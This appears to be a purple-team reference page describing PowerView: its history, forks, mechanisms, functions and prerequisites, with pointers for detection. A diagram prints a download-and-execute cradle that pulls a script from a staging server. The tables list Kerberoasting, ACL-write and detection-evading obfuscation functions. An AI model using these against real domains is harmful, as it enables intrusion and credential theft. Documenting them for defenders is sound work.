# PowerView — Overview

> 🔴 **Red Flag Principle:** PowerView is a pure-PowerShell wrapper over .NET's `System.DirectoryServices` (ADSI) for LDAP work and raw Win32 API calls (via reflective `Add-Win32Type`/P/Invoke, never a compiled helper DLL) for SAMR/session enumeration — it makes **no network connection PowerView "invented"**. Every `Get-Domain*` function is, underneath, an ordinary authenticated LDAP bind and search that any domain-joined identity can already perform. That means the strongest detection signal is almost never "PowerView touched the network" — it's the **volume, breadth, and process-identity** of that querying (a single host issuing thousands of LDAP searches across every OU in a domain in a few minutes, from `powershell.exe` rather than `dsa.msc`), not the query mechanism itself. See `Purple Teaming/AdFind/04 - Target Evidence.md` for the near-identical "AD logs almost nothing about a normal LDAP read by default" problem — it applies here just as directly.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Function Reference — Quick Reference](#function-reference--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

PowerView was written by **Will Schroeder (`@harmj0y`)**, first as part of the **Veil-Framework's `PowerTools`** project (alongside the original `PowerUp`), then folded into **`PowerShellMafia/PowerSploit`**'s `Recon/` directory, where it lived for the rest of its actively-developed life. License: **BSD 3-Clause**, per the repo's `LICENSE` file.

**The archived-upstream situation, verified live against the GitHub API (2026-08-04):** `PowerShellMafia/PowerSploit` is **archived** (`"archived": true`), confirmed directly via `GET /repos/PowerShellMafia/PowerSploit`. The repository's last real commit predates archival by several months — the API's `pushed_at` for the repo reads `2020-08-17`, and the archive banner has been up since **January 2021**. The repo carries two branches, `master` and `dev`; fetched and diffed live, **they are byte-identical** (both `Recon/PowerView.ps1` copies are 20,914 lines) — there is no newer, unreleased "dev" version of PowerView sitting unmerged. `Recon/PowerView.ps1`'s own last-commit author/date, pulled directly from the GitHub API, is **HarmJ0y, 2018-07-02** — PowerView's functional development effectively stopped over two years before the repo was formally archived.

**A major internal rename already happened once, within PowerSploit's own history, and most third-party cheat sheets never caught up.** PowerView 2.x used `Get-Net*`/`Invoke-*Hunter` naming (`Get-NetUser`, `Get-NetGroup`, `Invoke-UserHunter`, `Invoke-EnumerateLocalAdmin`, …). A large late-2016 refactor renamed the entire surface to the current `Get-Domain*`/`Find-Domain*` convention (`Get-DomainUser`, `Get-DomainGroup`, `Find-DomainUserLocation`, `Find-DomainLocalGroupMember`, …) — verified directly in the live source: the file ends with a **52-line `Set-Alias` block** (`Set-Alias Get-NetUser Get-DomainUser`, `Set-Alias Invoke-UserHunter Find-DomainUserLocation`, etc.) mapping every legacy 2.x name onto its 3.x replacement. Both names work today; the alias is silent (no deprecation warning), so a hunt or a write-up built only around the old names still functions but is reading stale terminology.

**The canonical-source question this build was told to resolve live:** with the original repo archived and frozen since 2018 (functionally) / 2020 (literally), **is there an actively-maintained fork that's actually ahead of it?** Verified live, the answer is **yes, but it isn't a standalone PowerView repository** — no organization publishes a maintained, standalone `PowerView.ps1` fork as its own GitHub project (a GitHub API repo search for `PowerView` under 20 stars turns up only unrelated smart-blind/IoT projects using the same name). Instead, the actively-maintained superset lives **embedded as a module-source file inside `BC-SECURITY/Empire`** (see `Purple Teaming/PowerShell Empire/01 - Overview.md` for Empire itself), at `empire/server/data/module_source/situational_awareness/network/powerview.ps1` — and it is genuinely, substantially ahead:

| | PowerShellMafia (archived, final state) | BC-SECURITY/Empire's copy (verified live, 2026-08-04) |
|---|---|---|
| Lines | 20,914 | 25,308 |
| `function` definitions | 101 | 124 |
| Last touched | 2018-07-02 (functional) | 2026-04-19 (`Fix powerview addnetuser`, PR #814) |

Diffing the two function lists live surfaces **23 functions that exist only in BC-SECURITY's copy**, clustered around capability the original PowerView never had: ADCS/certificate-service enumeration (`Get-DomainCACertificates`, `Get-DomainEnrollmentServers`), Resource-Based Constrained Delegation abuse (`Get-DomainRBCD`, `Set-DomainRBCD`), a direct DCSync-rights check (`Get-DomainDCSync`), a LAPS-readers check (`Get-DomainLAPSReaders`), object security-descriptor get/set primitives (`Get-DomainObjectSD`, `Set-DomainObjectSD`), a "flag the juiciest accounts" helper (`Find-HighValueAccounts`), a raw-LDAP query path that bypasses the ADSI/`DirectorySearcher` object model entirely (`Invoke-LDAPQuery`, authored by BC-SECURITY's **Charlie Clark**, `@exploitph`), and — notably — a small built-in **query-obfuscation toolkit** (`Get-ObfuscatedFilterString`, `Get-RandomizedCasing`, `Get-IdentityFilterString`) purpose-built to evade signature-based LDAP-filter detections. This module documents the **BC-SECURITY/Empire copy as the current, actively-maintained reference** for function names and behavior, while noting explicitly where a function/parameter is fork-only versus present in both. Every function this page and its siblings cite by name was checked against live source, not memory.

**A separate, non-PowerShell lineage worth flagging for completeness:** [`aniqfakhrul/powerview.py`](https://github.com/aniqfakhrul/powerview.py) is a from-scratch Python reimplementation (985 stars, last pushed 2026-06-09 — actively maintained as of this writing) that reproduces PowerView's command surface for Linux-based operators. It is a genuinely separate codebase (not a fork of the PowerShell source), out of scope for this page's function-level verification, but worth knowing it exists — an analyst who sees "PowerView-style" LDAP query patterns from a non-Windows source IP is very plausibly looking at this tool, not a Windows host running the PowerShell module.

## How It Works

PowerView has **no compiled component and no CLI binary** — it is a `.ps1` script defining ~100+ PowerShell functions, loaded into a live PowerShell session (dot-sourced, `Import-Module`'d, or downloaded and `Invoke-Expression`'d directly into memory) and then called interactively like any other cmdlet. Everything it does reduces to one of three underlying mechanisms:

**1. LDAP via `System.DirectoryServices` (ADSI).** The overwhelming majority of `Get-Domain*`/`Find-Domain*` functions build an LDAP filter string, hand it to a helper (`Get-DomainSearcher`) that constructs a `[System.DirectoryServices.DirectorySearcher]` bound to `LDAP://<domain-or-server>[:port]/<searchbase>`, and enumerate the results. This is .NET's standard managed LDAP client — the same underlying Win32 `wldap32.dll` that AdFind's native client calls directly (see `Purple Teaming/AdFind/01 - Overview.md`), but reached through a higher-level, garbage-collected object wrapper rather than AdFind's raw API calls. BC-SECURITY's `Invoke-LDAPQuery` addition bypasses `DirectorySearcher` entirely in favor of `System.DirectoryServices.Protocols` (`LdapConnection`/`SearchRequest`) — a lower-level, more controllable LDAP client that gives an operator finer control over the wire-level query (useful for the obfuscation helpers listed above).

**2. SAMR / Win32 API via reflective P/Invoke — no `net.exe`, no compiled DLL.** Functions that enumerate local group membership or active sessions on a *remote* host (`Get-NetLocalGroup`-style helpers, `Get-NetSession`, `Get-NetLoggedon`) do **not** shell out to `net.exe` or `query user`. PowerView uses the same **`New-InMemoryModule`/`Add-Win32Type` reflective-P/Invoke pattern** that PowerUp uses for its service-manipulation calls (see `PowerUp/01 - Overview.md`) — it dynamically defines a .NET type wrapping `NetLocalGroupGetMembers`/`NetSessionEnum`/`NetWkstaUserEnum` from `netapi32.dll`, entirely in memory, and calls it directly. The practical effect: no `net.exe`/`net1.exe` child process ever appears in the process tree for these operations, unlike a manual `net group /domain` or `net session \\host` equivalent.

**3. Kerberos, for the SPN-ticket/Kerberoasting path.** `Get-DomainSPNTicket` (wrapped by `Invoke-Kerberoast`) uses .NET's `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` to request a real service ticket (TGS-REQ/TGS-REP) for a target SPN from the KDC, then extracts the ciphertext for offline cracking — the same underlying Kerberos exchange `Impacket/GetUserSPNs/` performs (see that page for the KDC-side event/enctype mechanics, cross-linked rather than re-derived).

```
Operator's Session                          Domain Controller
────────────────────                        ──────────────────
IEX(New-Object Net.WebClient)                              (no target-side
  .DownloadString('http://.../powerview.ps1')                network hit yet —
        │  (loads into memory, no disk write)                 script fetch is
        ▼                                                       from a staging
Get-DomainUser -SPN                                              server, not
Get-DomainGroupMember -Identity "Domain Admins" -Recurse          the DC)
Find-InterestingDomainAcl
Invoke-Kerberoast -OutputFormat Hashcat        ──LDAP/389───▶  ntds.dit-backed
        │                                       ──Kerberos/88─▶ query/TGS-REP
        ▼
Offline analysis / Hashcat / chained tool
```

## Techniques / Protocols Used

| Protocol/Mechanism | Port(s) | Used by |
|---|---|---|
| LDAP / LDAPS | 389 / 636 (Global Catalog: 3268 / 3269) | Nearly every `Get-Domain*`/`Find-Domain*` function — the core of the tool |
| SAMR / RPC over SMB | 445 (named pipe) or 135 + dynamic RPC | `Get-NetSession`, `Get-NetLoggedon`, local-group-membership helpers, `Find-DomainUserLocation`, `Find-LocalAdminAccess`/`Test-AdminAccess` |
| Kerberos (AS-REQ/TGS-REQ) | 88 | `Get-DomainSPNTicket`/`Invoke-Kerberoast`, `Invoke-UserImpersonation` (Kerberos ticket-based impersonation for alternate-credential queries) |
| DNS (AD-integrated zones) | 53 | `Get-DomainDNSZone`/`Get-DomainDNSRecord` |
| WMI (legacy subset) | 135 + dynamic RPC | A small set of legacy functions (`Get-NetProcess`, `Get-WMIRegLastLoggedOn`, `Get-WMIRegCachedRDPConnection`, `Get-WMIRegMountedDrive`, `Get-WMIRegProxy`) — these are the exception to the "no WMI" rule and are worth flagging separately when reviewing a suspected PowerView session's WMI-Activity log footprint |

## Function Reference — Quick Reference

PowerView has no CLI switches of its own — it's a function library, so the equivalent "man page" is the function surface itself. Grouped by category (BC-SECURITY-fork-only functions marked **(fork)**):

| Category | Key Functions | What they do |
|---|---|---|
| **Domain/Forest Info** | `Get-Domain`, `Get-DomainController`, `Get-Forest`, `Get-ForestDomain`, `Get-DomainPolicyData` | Baseline domain/forest metadata, DC list, and effective password/lockout policy |
| **User Enumeration** | `Get-DomainUser` (`-SPN`, `-PreauthNotRequired`, `-AdminCount`, `-AllowDelegation`, `-TrustedToAuth`, `-UACFilter`), `Get-DomainForeignUser` | Full LDAP user-object search with attacker-relevant filter switches built in — Kerberoastable (`-SPN`), AS-REP-roastable (`-PreauthNotRequired`), currently/formerly privileged (`-AdminCount`) |
| **Computer Enumeration** | `Get-DomainComputer` (`-Unconstrained`, `-TrustedToAuth`, `-Printers`, `-SPN`, `-OperatingSystem`) | Computer-object search, including unconstrained/constrained delegation flags |
| **Group Enumeration** | `Get-DomainGroup`, `Get-DomainGroupMember` (`-Recurse`), `Get-DomainManagedSecurityGroup` | Group membership, including recursive nested-group resolution |
| **ACL / Object Security** | `Get-DomainObjectAcl`, `Add-DomainObjectAcl`, `Find-InterestingDomainAcl`, `Get-DomainObjectSD`/`Set-DomainObjectSD` **(fork)** | Read and — critically — **write** an object's access-control entries; `Find-InterestingDomainAcl` filters for non-default, attacker-useful ACEs across the whole domain |
| **Trusts** | `Get-DomainTrust`, `Get-ForestTrust`, `Get-DomainTrustMapping` | Single-domain and whole-forest/cross-forest trust enumeration and recursive trust-graph mapping |
| **GPO** | `Get-DomainGPO`, `Get-DomainGPOLocalGroup`, `Get-DomainGPOUserLocalGroupMapping`, `Get-DomainGPOComputerLocalGroupMapping` | GPO enumeration and reverse-mapping "which GPOs push local admin rights to which computers/users" |
| **Local Admin / Session Hunting** | `Find-LocalAdminAccess`, `Test-AdminAccess`, `Find-DomainUserLocation` | Fleet-wide "where do I have admin," "who is logged in where" sweeps — SAMR-based, threaded |
| **Kerberos** | `Get-DomainSPNTicket`, `Invoke-Kerberoast` (`-OutputFormat John/Hashcat`) | SPN discovery + TGS request + hash extraction in one call |
| **Shares/Files** | `Find-DomainShare`, `Find-InterestingDomainShareFile` | SMB share enumeration and content search across every discovered share |
| **DACL/DCSync (fork)** | `Get-DomainDCSync`, `Get-DomainRBCD`/`Set-DomainRBCD`, `Get-DomainLAPSReaders` | Direct checks for DCSync-capable rights, RBCD read/write, and LAPS-password-readable principals |
| **ADCS (fork)** | `Get-DomainCACertificates`, `Get-DomainEnrollmentServers` | Certificate Authority and enrollment-server discovery — see `Purple Teaming/GhostPack/Certify/` (Wave 3, not yet built) and `Purple Teaming/Certipy/` (Wave 3, not yet built) for the follow-on abuse tooling once a target is identified |
| **Obfuscation (fork)** | `Get-ObfuscatedFilterString`, `Get-RandomizedCasing`, `Get-IdentityFilterString` | Randomize LDAP filter casing/structure to evade static signature matching on the filter string itself |
| **Utility/Conversion** | `ConvertTo-SID`, `ConvertFrom-SID`, `Convert-ADName`, `Invoke-UserImpersonation`/`Invoke-RevertToSelf` | SID↔name resolution and alternate-credential Kerberos-token impersonation for the rest of the toolkit |

## Quick Use-Case List

- Baseline domain/forest reconnaissance (`Get-Domain`, `Get-DomainController`, `Get-DomainPolicyData`)
- Enumerating domain users, including Kerberoastable and AS-REP-roastable accounts
- Enumerating domain computers, including unconstrained/constrained-delegation-trusted hosts
- Enumerating and recursively resolving group membership (nested groups)
- Mapping domain and forest trusts
- Discovering ACL-based privilege-escalation paths and, where rights allow, writing a new ACE
- Kerberoasting via `Invoke-Kerberoast` (SPN discovery through hash extraction in one call)
- GPO enumeration and GPO-to-local-admin reverse mapping
- Fleet-wide local-admin-access hunting (`Find-LocalAdminAccess`)
- Fleet-wide user-session hunting (`Find-DomainUserLocation`)
- Domain share discovery and sensitive-file content search
- Domain password/lockout policy discovery
- SID↔name resolution and cross-domain name translation
- Alternate-credential enumeration via Kerberos-ticket impersonation (`Invoke-UserImpersonation`)
- **(Fork-only)** ADCS/certificate-service discovery, DCSync-rights checks, RBCD abuse, LAPS-reader discovery, and built-in LDAP-filter obfuscation

## Prerequisites

| Use case | Requirement |
|---|---|
| Any `Get-Domain*`/`Find-Domain*` function | Network line-of-sight to a domain controller on 389/636 (or 3268/3269 for Global Catalog); **any** valid, unprivileged domain credential is enough for read-only enumeration — no local admin needed |
| SAMR-based session/local-admin hunting | The querying account must be able to reach the target's SAMR/RPC endpoint (445 or 135+dynamic); results are naturally filtered by what SAMR permits an unprivileged caller to see (varies by OS build/hardening) |
| `Invoke-Kerberoast` | At least one target account with a populated `servicePrincipalName` — no special rights beyond a valid domain logon |
| ACL **write** functions (`Add-DomainObjectAcl`, `Set-DomainObjectSD`) | The operator's account must already hold sufficient rights (`WriteDacl`/`GenericAll`/owner) over the target object — PowerView cannot grant itself rights it doesn't already have |
| Loading the module at all | PowerShell 2.0+ (most functions), .NET Framework for the ADSI/reflection layer; no admin rights required just to import/dot-source the script |
